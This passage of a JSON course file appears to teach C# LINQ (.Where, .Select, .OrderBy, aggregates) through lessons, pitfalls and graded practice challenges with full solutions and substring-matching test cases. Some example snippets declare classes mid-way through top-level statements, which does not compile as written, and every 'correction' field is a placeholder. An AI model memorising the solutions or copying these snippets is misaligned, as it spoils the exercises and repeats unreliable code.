                {
                  "mistake": ".Count vs .Count()",
                  "consequence": "IEnumerable<T> has .Count() METHOD (executes query!). List<T> has .Count PROPERTY (instant). Using .Count() on large IEnumerable can be slow!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-09-03",
          "title": "Filtering with .Where() (The Filter Funnel)",
          "moduleId": "module-09",
          "order": 3,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine gold miners using a sieve (filter) to separate gold from dirt. The filter lets ONLY gold through!\n\nThat's .Where() - it's a FILTER for collections:\n• Input: A collection of items\n• Process: Test each item with a condition\n• Output: Only items that pass the test\n\nThe condition is a LAMBDA EXPRESSION:\n• 'x => x > 5' means 'for each x, check if x > 5'\n• 'x' is the current item\n• '=>' means 'goes to' or 'such that'\n• Right side is the boolean condition\n\nMultiple conditions?\n• AND: .Where(x => x > 5 && x < 10)\n• OR: .Where(x => x == 1 || x == 100)\n• Method calls: .Where(x => x.StartsWith(\"A\"))\n\nThink: .Where() = 'Keep only the items that match my criteria, discard the rest.'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nList<int> numbers = new List<int> { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\n\n// Simple filter\nvar evens = numbers.Where(n => n % 2 == 0);\nConsole.WriteLine(\"Evens: \" + string.Join(\", \", evens));\n\n// Multiple conditions with AND\nvar range = numbers.Where(n => n > 3 && n < 8);\nConsole.WriteLine(\"Between 3 and 8: \" + string.Join(\", \", range));\n\n// OR conditions\nvar extremes = numbers.Where(n => n <= 2 || n >= 9);\nConsole.WriteLine(\"Extremes: \" + string.Join(\", \", extremes));\n\n// Working with objects\nclass Person\n{\n    public string Name;\n    public int Age;\n    public string City;\n}\n\nList<Person> people = new List<Person>\n{\n    new Person { Name = \"Alice\", Age = 30, City = \"NYC\" },\n    new Person { Name = \"Bob\", Age = 25, City = \"LA\" },\n    new Person { Name = \"Charlie\", Age = 35, City = \"NYC\" },\n    new Person { Name = \"Diana\", Age = 28, City = \"Chicago\" }\n};\n\n// Filter by property\nvar inNYC = people.Where(p => p.City == \"NYC\");\nforeach (var person in inNYC)\n{\n    Console.WriteLine(person.Name + \" lives in NYC\");\n}\n\n// Complex filter: adults in NYC\nvar adultsInNYC = people.Where(p => p.Age >= 30 && p.City == \"NYC\");\nforeach (var person in adultsInNYC)\n{\n    Console.WriteLine(person.Name + \" is 30+ in NYC\");\n}\n\n// Method calls in filter\nvar startsWithC = people.Where(p => p.Name.StartsWith(\"C\"));\nforeach (var person in startsWithC)\n{\n    Console.WriteLine(\"Starts with C: \" + person.Name);\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`collection.Where(x => condition)`**: Where() tests each item. 'x' is each item (you choose the name!). Returns IEnumerable<T> with only items where condition is true.\n\n**`Lambda: x => expression`**: Lambda is anonymous function. 'x' is parameter. '=>' is lambda operator. Expression returns bool (true/false). Read: 'x such that expression'.\n\n**`Multiple conditions`**: Combine with && (AND), || (OR), ! (NOT). Example: 'x => x > 5 && x < 10' means 'between 5 and 10'.\n\n**`Object properties in lambdas`**: Access properties inside lambda: 'p => p.Age > 30'. Can call methods too: 'p => p.Name.Contains(\"a\")'."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Using = instead of ==**: Comparison requires double equals (==)! Single = is assignment and won't compile in a lambda condition: `x => x.Age = 30` is WRONG.\n\n**Null reference in lambda**: If a property could be null, check it first! `x => x.Name.StartsWith(\"A\")` will throw NullReferenceException if Name is null. Use: `x => x.Name != null && x.Name.StartsWith(\"A\")` or null-conditional: `x => x.Name?.StartsWith(\"A\") == true`.\n\n**Case sensitivity**: String comparisons are case-sensitive by default! `p.Category == \"electronics\"` won't match \"Electronics\". Use `.Equals(\"electronics\", StringComparison.OrdinalIgnoreCase)` for case-insensitive matching.\n\n**Operator precedence**: `x => x > 5 && x < 10 || x == 100` may not work as expected! Use parentheses for clarity: `x => (x > 5 && x < 10) || x == 100`."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-09-03-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a product filtering system!\n\n1. Create a 'Product' class:\n   - string Name\n   - decimal Price\n   - string Category\n   - int Stock\n\n2. Create a List with at least 6 products:\n   - Mix of Electronics, Clothing, Books\n   - Varying prices ($10 - $500)\n   - Different stock levels (0 - 100)\n\n3. Use .Where() to find:\n   - Products under $50\n   - Electronics with stock > 0\n   - Products that are either Books OR price > $200\n   - Out of stock items (stock == 0)\n\n4. Display results for each filter with descriptive labels",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Product\n{\n    public string Name;\n    public decimal Price;\n    public string Category;\n    public int Stock;\n}\n\nList<Product> products = new List<Product>\n{\n    new Product { Name = \"Laptop\", Price = 999, Category = \"Electronics\", Stock = 5 },\n    new Product { Name = \"Shirt\", Price = 25, Category = \"Clothing\", Stock = 50 },\n    // Add 4 more products\n};\n\n// Filter 1: Under $50\nvar affordable = products.Where(p => /* condition */);\n\n// Filter 2: Electronics in stock\nvar availableElectronics = products.Where(p => /* condition */);\n\n// Filter 3: Books OR expensive\nvar booksOrExpensive = products.Where(p => /* condition */);\n\n// Filter 4: Out of stock\nvar outOfStock = products.Where(p => /* condition */);",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Product\n{\n    public string Name;\n    public decimal Price;\n    public string Category;\n    public int Stock;\n}\n\nList<Product> products = new List<Product>\n{\n    new Product { Name = \"Laptop\", Price = 999, Category = \"Electronics\", Stock = 5 },\n    new Product { Name = \"Shirt\", Price = 25, Category = \"Clothing\", Stock = 50 },\n    new Product { Name = \"Novel\", Price = 15, Category = \"Books\", Stock = 0 },\n    new Product { Name = \"Headphones\", Price = 79, Category = \"Electronics\", Stock = 20 },\n    new Product { Name = \"Jeans\", Price = 45, Category = \"Clothing\", Stock = 30 },\n    new Product { Name = \"Tablet\", Price = 299, Category = \"Electronics\", Stock = 0 }\n};\n\nvar affordable = products.Where(p => p.Price < 50);\nConsole.WriteLine(\"Products under $50:\");\nforeach (var p in affordable)\n{\n    Console.WriteLine(\"- \" + p.Name + \": $\" + p.Price);\n}\n\nvar availableElectronics = products.Where(p => p.Category == \"Electronics\" && p.Stock > 0);\nConsole.WriteLine(\"\\nElectronics in stock:\");\nforeach (var p in availableElectronics)\n{\n    Console.WriteLine(\"- \" + p.Name + \" (\" + p.Stock + \" units)\");\n}\n\nvar booksOrExpensive = products.Where(p => p.Category == \"Books\" || p.Price > 200);\nConsole.WriteLine(\"\\nBooks OR price > $200:\");\nforeach (var p in booksOrExpensive)\n{\n    Console.WriteLine(\"- \" + p.Name);\n}\n\nvar outOfStock = products.Where(p => p.Stock == 0);\nConsole.WriteLine(\"\\nOut of stock:\");\nforeach (var p in outOfStock)\n{\n    Console.WriteLine(\"- \" + p.Name);\n}",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"under $50\"",
                  "expectedOutput": "under $50",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Electronics in stock\"",
                  "expectedOutput": "Electronics in stock",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Out of stock\"",
                  "expectedOutput": "Out of stock",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Where syntax: '.Where(item => condition)'. AND: '&&'. OR: '||'. Compare strings: 'p.Category == \"Books\"'. Property access: 'p.Price', 'p.Stock'."
                },
                {
                  "level": 2,
                  "text": "Using = instead of ==: Comparison is '==' (double equals)! Single '=' is assignment, won't work in lambda. 'x => x.Age = 30' is ERROR!"
                },
                {
                  "level": 3,
                  "text": "Forgetting parentheses with complex conditions: 'x => x > 5 && x < 10 || x == 100' can be ambiguous! Use parentheses: 'x => (x > 5 && x < 10) || x == 100'."
                },
                {
                  "level": 4,
                  "text": "Case sensitivity in string comparison: 'Category == \"electronics\"' won't match \"Electronics\"! Use .Equals(\"electronics\", StringComparison.OrdinalIgnoreCase) for case-insensitive."
                },
                {
                  "level": 5,
                  "text": "Null reference in lambda: If object property could be null, check first! 'x => x.Name.StartsWith(\"A\")' crashes if Name is null. Use: 'x => x.Name != null && x.Name.StartsWith(\"A\")'."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using = instead of ==",
                  "consequence": "Comparison is '==' (double equals)! Single '=' is assignment, won't work in lambda. 'x => x.Age = 30' is ERROR!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting parentheses with complex conditions",
                  "consequence": "'x => x > 5 && x < 10 || x == 100' can be ambiguous! Use parentheses: 'x => (x > 5 && x < 10) || x == 100'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Case sensitivity in string comparison",
                  "consequence": "'Category == \"electronics\"' won't match \"Electronics\"! Use .Equals(\"electronics\", StringComparison.OrdinalIgnoreCase) for case-insensitive.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Null reference in lambda",
                  "consequence": "If object property could be null, check first! 'x => x.Name.StartsWith(\"A\")' crashes if Name is null. Use: 'x => x.Name != null && x.Name.StartsWith(\"A\")'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-09-04",
          "title": "Transforming with .Select() (The Transformation Machine)",
          "moduleId": "module-09",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a factory machine that takes raw materials and TRANSFORMS them:\n• Input: Raw wood → Output: Furniture\n• Input: Fruit → Output: Juice\n• Input: Cotton → Output: T-shirts\n\nThat's .Select() - it TRANSFORMS each item in a collection:\n• Input: List of numbers → Output: Each number squared\n• Input: List of people → Output: Just their names\n• Input: List of products → Output: Just their prices\n\n.Where() FILTERS (keeps some items), .Select() TRANSFORMS (changes each item)!\n\nYou can transform to:\n• Same type: numbers → numbers * 2\n• Different type: Person objects → string names\n• New anonymous objects: { Name = p.Name, IsAdult = p.Age >= 18 }\n\nThink: .Select() = 'Transform every item in the collection using this recipe.'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nList<int> numbers = new List<int> { 1, 2, 3, 4, 5 };\n\n// Transform to same type\nvar squared = numbers.Select(n => n * n);\nConsole.WriteLine(\"Squared: \" + string.Join(\", \", squared));\n\nvar doubled = numbers.Select(n => n * 2);\nConsole.WriteLine(\"Doubled: \" + string.Join(\", \", doubled));\n\n// Transform with objects\nclass Person\n{\n    public string Name;\n    public int Age;\n    public string City;\n}\n\nList<Person> people = new List<Person>\n{\n    new Person { Name = \"Alice\", Age = 30, City = \"NYC\" },\n    new Person { Name = \"Bob\", Age = 25, City = \"LA\" },\n    new Person { Name = \"Charlie\", Age = 35, City = \"Chicago\" }\n};\n\n// Extract just names (object → string)\nvar names = people.Select(p => p.Name);\nConsole.WriteLine(\"Names: \" + string.Join(\", \", names));\n\n// Extract ages (object → int)\nvar ages = people.Select(p => p.Age);\nConsole.WriteLine(\"Ages: \" + string.Join(\", \", ages));\n\n// Transform to new anonymous object\nvar summaries = people.Select(p => new \n{ \n    Name = p.Name, \n    IsAdult = p.Age >= 18,\n    Location = p.City\n});\n\nforeach (var summary in summaries)\n{\n    Console.WriteLine(summary.Name + \" - Adult: \" + summary.IsAdult + \" - \" + summary.Location);\n}\n\n// Combine .Where() and .Select()\nvar adultNames = people\n    .Where(p => p.Age >= 30)\n    .Select(p => p.Name);\n\nConsole.WriteLine(\"Adults (30+): \" + string.Join(\", \", adultNames));",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`collection.Select(x => transformation)`**: Select() transforms each item. Returns IEnumerable with transformed items. EVERY item is transformed (unlike Where which filters).\n\n**`Same type transform`**: numbers.Select(n => n * 2) takes int, returns int. But creates NEW collection - original unchanged!\n\n**`Type change transform`**: people.Select(p => p.Name) takes Person, returns string. Output type changes! IEnumerable<Person> → IEnumerable<string>.\n\n**`Anonymous object: new { }`**: Create unnamed object on-the-fly: 'new { Prop1 = value, Prop2 = value }'. Great for reshaping data! Type inferred by compiler."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Confusing Where() and Select()**: Where() FILTERS (keeps some items, discards others). Select() TRANSFORMS (changes every item). If you want to remove items, use Where(). If you want to change items, use Select().\n\n**Forgetting to capture result**: `.Select()` returns a NEW sequence - it doesn't modify the original! `list.Select(x => x * 2);` on its own does nothing. You must assign: `var doubled = list.Select(x => x * 2);`\n\n**Anonymous objects can't leave the method**: Anonymous types (`new { Name = x.Name }`) are local only! You cannot return them from methods or store in class fields. For data that needs to leave the method, create a proper class or use ValueTuple.\n\n**Decimal precision with money**: When calculating prices, use the 'm' suffix: `p.Price * 0.9m` not `p.Price * 0.9`. Without 'm', you get double which has floating-point precision issues with money!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-09-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a product summary report using .Select()!\n\n1. Create a 'Product' class:\n   - string Name\n   - decimal Price\n   - string Category\n   - int Stock\n\n2. Create a List with 5+ products\n\n3. Use .Select() to create:\n   - List of just product names\n   - List of prices with 10% discount applied\n   - List of anonymous objects with:\n     - Name\n     - Category\n     - TotalValue (Price * Stock)\n     - InStock (Stock > 0)\n\n4. Use .Where().Select() to get names of products under $100\n\n5. Display all results",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Product\n{\n    public string Name;\n    public decimal Price;\n    public string Category;\n    public int Stock;\n}\n\nList<Product> products = new List<Product>\n{\n    new Product { Name = \"Laptop\", Price = 999, Category = \"Electronics\", Stock = 5 },\n    // Add 4 more products\n};\n\n// Extract names\nvar productNames = products.Select(p => /* transform */);\n\n// Calculate discounted prices\nvar discountedPrices = products.Select(p => /* transform */);\n\n// Create summary objects\nvar summaries = products.Select(p => new\n{\n    // Properties\n});\n\n// Names of affordable products\nvar affordableNames = products\n    .Where(p => /* filter */)\n    .Select(p => /* transform */);",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Product\n{\n    public string Name;\n    public decimal Price;\n    public string Category;\n    public int Stock;\n}\n\nList<Product> products = new List<Product>\n{\n    new Product { Name = \"Laptop\", Price = 999, Category = \"Electronics\", Stock = 5 },\n    new Product { Name = \"Mouse\", Price = 25, Category = \"Electronics\", Stock = 50 },\n    new Product { Name = \"Keyboard\", Price = 75, Category = \"Electronics\", Stock = 30 },\n    new Product { Name = \"Monitor\", Price = 299, Category = \"Electronics\", Stock = 0 },\n    new Product { Name = \"Webcam\", Price = 89, Category = \"Electronics\", Stock = 15 }\n};\n\nvar productNames = products.Select(p => p.Name);\nConsole.WriteLine(\"Product names: \" + string.Join(\", \", productNames));\n\nvar discountedPrices = products.Select(p => p.Price * 0.9m);\nConsole.WriteLine(\"\\nDiscounted prices: $\" + string.Join(\", $\", discountedPrices));\n\nvar summaries = products.Select(p => new\n{\n    Name = p.Name,\n    Category = p.Category,\n    TotalValue = p.Price * p.Stock,\n    InStock = p.Stock > 0\n});\n\nConsole.WriteLine(\"\\nProduct summaries:\");\nforeach (var s in summaries)\n{\n    Console.WriteLine(s.Name + \" (\" + s.Category + \") - Value: $\" + s.TotalValue + \" - In stock: \" + s.InStock);\n}\n\nvar affordableNames = products\n    .Where(p => p.Price < 100)\n    .Select(p => p.Name);\n\nConsole.WriteLine(\"\\nAffordable products: \" + string.Join(\", \", affordableNames));",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Product names\"",
                  "expectedOutput": "Product names",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Discounted prices\"",
                  "expectedOutput": "Discounted prices",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Affordable products\"",
                  "expectedOutput": "Affordable products",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Select syntax: '.Select(item => newValue)'. Extract property: 'p => p.Name'. Calculate: 'p => p.Price * 0.9m'. Anonymous object: 'new { Prop = value }'."
                },
                {
                  "level": 2,
                  "text": "Confusing .Where() and .Select(): Where FILTERS (fewer items). Select TRANSFORMS (same number, but changed). Don't use Select for filtering!"
                },
                {
                  "level": 3,
                  "text": "Forgetting to capture result: '.Select()' doesn't modify original! 'list.Select(x => x * 2)' does nothing. Must assign: 'var result = list.Select(x => x * 2)'."
                },
                {
                  "level": 4,
                  "text": "Anonymous object outside method: Anonymous objects can't be returned from methods or stored in fields! Only use locally. For return values, create a proper class."
                },
                {
                  "level": 5,
                  "text": "Decimal precision: When doing math with prices, use 'm' suffix: '0.9m' not '0.9'. Otherwise you get double (less precise for money!)."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Confusing .Where() and .Select()",
                  "consequence": "Where FILTERS (fewer items). Select TRANSFORMS (same number, but changed). Don't use Select for filtering!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to capture result",
                  "consequence": "'.Select()' doesn't modify original! 'list.Select(x => x * 2)' does nothing. Must assign: 'var result = list.Select(x => x * 2)'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Anonymous object outside method",
                  "consequence": "Anonymous objects can't be returned from methods or stored in fields! Only use locally. For return values, create a proper class.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Decimal precision",
                  "consequence": "When doing math with prices, use 'm' suffix: '0.9m' not '0.9'. Otherwise you get double (less precise for money!).",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-09-05",
          "title": "Sorting & Aggregating (.OrderBy, .Sum, .Count)",
          "moduleId": "module-09",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine organizing your bookshelf:\n• SORTING: Arrange books alphabetically by title or author\n• COUNTING: How many books do you have?\n• SUMMING: What's the total value of all books?\n• FINDING: What's the most expensive book? The cheapest?\n\nLINQ has methods for all of these!\n\nSORTING:\n• .OrderBy(x => x) - Ascending (1, 2, 3...)\n• .OrderByDescending(x => x) - Descending (3, 2, 1...)\n• .ThenBy(x => x) - Secondary sort\n\nAGGREGATING (computing single value from collection):\n• .Count() - How many items?\n• .Sum(x => x) - Add them up\n• .Average(x => x) - Mean value\n• .Min(x => x) / .Max(x => x) - Smallest/largest\n\nThink: Sorting organizes. Aggregating calculates. Both are essential for data analysis!"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nList<int> numbers = new List<int> { 5, 2, 8, 1, 9, 3, 7 };\n\n// SORTING\nvar ascending = numbers.OrderBy(n => n);\nConsole.WriteLine(\"Ascending: \" + string.Join(\", \", ascending));\n\nvar descending = numbers.OrderByDescending(n => n);\nConsole.WriteLine(\"Descending: \" + string.Join(\", \", descending));\n\n// AGGREGATING\nint count = numbers.Count();\nint sum = numbers.Sum();\ndouble average = numbers.Average();\nint min = numbers.Min();\nint max = numbers.Max();\n\nConsole.WriteLine(\"Count: \" + count);\nConsole.WriteLine(\"Sum: \" + sum);\nConsole.WriteLine(\"Average: \" + average);\nConsole.WriteLine(\"Min: \" + min + \", Max: \" + max);\n\n// WORKING WITH OBJECTS\nclass Product\n{\n    public string Name;\n    public decimal Price;\n    public string Category;\n}\n\nList<Product> products = new List<Product>\n{\n    new Product { Name = \"Laptop\", Price = 999, Category = \"Electronics\" },\n    new Product { Name = \"Mouse\", Price = 25, Category = \"Electronics\" },\n    new Product { Name = \"Desk\", Price = 299, Category = \"Furniture\" },\n    new Product { Name = \"Chair\", Price = 199, Category = \"Furniture\" }\n};\n\n// Sort by price\nvar byPrice = products.OrderBy(p => p.Price);\nforeach (var p in byPrice)\n{\n    Console.WriteLine(p.Name + \": $\" + p.Price);\n}\n\n// Sort by name, then by price (multi-level)\nvar sorted = products\n    .OrderBy(p => p.Category)\n    .ThenBy(p => p.Price);\n\nforeach (var p in sorted)\n{\n    Console.WriteLine(p.Category + \" - \" + p.Name + \": $\" + p.Price);\n}\n\n// Aggregate with selector\nint productCount = products.Count();\ndecimal totalValue = products.Sum(p => p.Price);\ndecimal avgPrice = products.Average(p => p.Price);\ndecimal cheapest = products.Min(p => p.Price);\ndecimal mostExpensive = products.Max(p => p.Price);\n\nConsole.WriteLine(\"Total products: \" + productCount);\nConsole.WriteLine(\"Total value: $\" + totalValue);\nConsole.WriteLine(\"Average price: $\" + avgPrice);\nConsole.WriteLine(\"Price range: $\" + cheapest + \" - $\" + mostExpensive);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`.OrderBy(x => key)`**: Sorts ascending by key. For numbers: .OrderBy(n => n). For objects: .OrderBy(p => p.Price). Returns IEnumerable in sorted order.\n\n**`.ThenBy(x => secondKey)`**: Secondary sort after OrderBy. Example: .OrderBy(p => p.Category).ThenBy(p => p.Name) sorts by category first, then name within each category.\n\n**`.Count(), .Sum(), .Average()`**: Aggregation methods return single value. .Count() returns int. .Sum() adds values. .Average() calculates mean. These EXECUTE the query immediately!\n\n**`.Min() / .Max()`**: Find smallest/largest. Simple: .Min() on numbers. With selector: .Max(p => p.Price) finds most expensive. Returns single value, not collection."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Mistakes!\n\n**Aggregate on empty collection**: `.Average()`, `.Min()`, `.Max()` throw exceptions on empty collections! Always check `.Any()` first: `list.Any() ? list.Average() : 0`. Or use `.DefaultIfEmpty()` before aggregating.\n\n**Forgetting selector in aggregate**: `.Sum()` on a collection of objects won't work! You must specify what to sum: `.Sum(p => p.Price)`. The parameterless versions only work on numeric collections.\n\n**OrderBy doesn't modify original**: Like all LINQ, `.OrderBy()` returns a NEW sequence! The original collection stays unsorted. You must use the result: `var sorted = list.OrderBy(...)`.\n\n**.Count property vs .Count() method**: `List<T>` has a `.Count` PROPERTY (O(1), instant). `IEnumerable<T>` only has `.Count()` METHOD which must iterate the entire collection! For large lazy sequences, `.Count()` can be very slow. Use `.Any()` instead of `.Count() > 0`."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-09-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a student grade analysis system!\n\n1. Create a 'Student' class:\n   - string Name\n   - int Grade (0-100)\n   - string Subject\n\n2. Create a List with 8+ students across 2-3 subjects\n\n3. Perform these operations:\n   - Sort students by grade (descending)\n   - Count how many students there are\n   - Calculate average grade\n   - Find highest and lowest grades\n   - Get sum of all grades\n   - Find students in \"Math\" subject, sorted by name\n   - Calculate average grade for \"Math\" students only\n\n4. Display all results with labels",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Student\n{\n    public string Name;\n    public int Grade;\n    public string Subject;\n}\n\nList<Student> students = new List<Student>\n{\n    new Student { Name = \"Alice\", Grade = 85, Subject = \"Math\" },\n    new Student { Name = \"Bob\", Grade = 92, Subject = \"Science\" },\n    // Add 6 more students\n};\n\n// Sort by grade descending\nvar byGrade = students.OrderByDescending(s => /* key */);\n\n// Aggregations\nint totalStudents = students.Count();\ndouble avgGrade = students.Average(s => /* selector */);\nint highest = students.Max(s => /* selector */);\nint lowest = students.Min(s => /* selector */);\nint totalGrades = students.Sum(s => /* selector */);\n\n// Math students sorted by name\nvar mathStudents = students\n    .Where(s => /* filter */)\n    .OrderBy(s => /* key */);\n\n// Math average\ndouble mathAvg = students\n    .Where(s => /* filter */)\n    .Average(s => /* selector */);",
              "solution": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Student\n{\n    public string Name;\n    public int Grade;\n    public string Subject;\n}\n\nList<Student> students = new List<Student>\n{\n    new Student { Name = \"Alice\", Grade = 85, Subject = \"Math\" },\n    new Student { Name = \"Bob\", Grade = 92, Subject = \"Science\" },\n    new Student { Name = \"Charlie\", Grade = 78, Subject = \"Math\" },\n    new Student { Name = \"Diana\", Grade = 95, Subject = \"Science\" },\n    new Student { Name = \"Eve\", Grade = 88, Subject = \"Math\" },\n    new Student { Name = \"Frank\", Grade = 72, Subject = \"English\" },\n    new Student { Name = \"Grace\", Grade = 90, Subject = \"English\" },\n    new Student { Name = \"Henry\", Grade = 83, Subject = \"Math\" }\n};\n\nvar byGrade = students.OrderByDescending(s => s.Grade);\nConsole.WriteLine(\"Students by grade (high to low):\");\nforeach (var s in byGrade)\n{\n    Console.WriteLine(s.Name + \": \" + s.Grade);\n}\n\nint totalStudents = students.Count();\ndouble avgGrade = students.Average(s => s.Grade);\nint highest = students.Max(s => s.Grade);\nint lowest = students.Min(s => s.Grade);\nint totalGrades = students.Sum(s => s.Grade);\n\nConsole.WriteLine(\"\\nStatistics:\");\nConsole.WriteLine(\"Total students: \" + totalStudents);\nConsole.WriteLine(\"Average grade: \" + avgGrade);\nConsole.WriteLine(\"Highest: \" + highest + \", Lowest: \" + lowest);\nConsole.WriteLine(\"Sum of all grades: \" + totalGrades);\n\nvar mathStudents = students\n    .Where(s => s.Subject == \"Math\")\n    .OrderBy(s => s.Name);\n\nConsole.WriteLine(\"\\nMath students (alphabetical):\");\nforeach (var s in mathStudents)\n{\n    Console.WriteLine(s.Name + \": \" + s.Grade);\n}\n\ndouble mathAvg = students\n    .Where(s => s.Subject == \"Math\")\n    .Average(s => s.Grade);\n\nConsole.WriteLine(\"\\nMath average: \" + mathAvg);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Total students\"",
                  "expectedOutput": "Total students",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Average grade\"",
                  "expectedOutput": "Average grade",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"Highest\"",
                  "expectedOutput": "Highest",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Math average\"",
                  "expectedOutput": "Math average",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "OrderBy: '.OrderBy(x => x.Property)'. Aggregates: '.Count()', '.Sum(x => x.Prop)', '.Average(x => x.Prop)', '.Min()/.Max()'. Chain with .Where() for filtered aggregates!"
                },
                {
                  "level": 2,
                  "text": "Forgetting selector in aggregate: '.Sum()' on objects doesn't work! Must specify what to sum: '.Sum(p => p.Price)'. Only works without selector on collections of numbers."
                },
                {
                  "level": 3,
                  "text": "OrderBy doesn't modify original: Like all LINQ, .OrderBy() returns NEW sequence! Original list is unchanged. Assign result: 'var sorted = list.OrderBy(...)'."
                },
                {
                  "level": 4,
                  "text": "Using .Count property vs .Count() method: IEnumerable has .Count() METHOD. List has .Count PROPERTY. Both work, but property is faster on List!"
                },
                {
                  "level": 5,
                  "text": "Average on empty collection: '.Average()' on empty collection throws exception! Check '.Any()' first, or use default: 'list.Any() ? list.Average() : 0'."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting selector in aggregate",
                  "consequence": "'.Sum()' on objects doesn't work! Must specify what to sum: '.Sum(p => p.Price)'. Only works without selector on collections of numbers.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "OrderBy doesn't modify original",
                  "consequence": "Like all LINQ, .OrderBy() returns NEW sequence! Original list is unchanged. Assign result: 'var sorted = list.OrderBy(...)'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using .Count property vs .Count() method",
                  "consequence": "IEnumerable has .Count() METHOD. List has .Count PROPERTY. Both work, but property is faster on List!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Average on empty collection",
                  "consequence": "'.Average()' on empty collection throws exception! Check '.Any()' first, or use default: 'list.Any() ? list.Average() : 0'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-09-06",
          "title": "Advanced LINQ (GroupBy, SelectMany, Join)",
          "moduleId": "module-09",
          "order": 6,
          "estimatedMinutes": 20,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
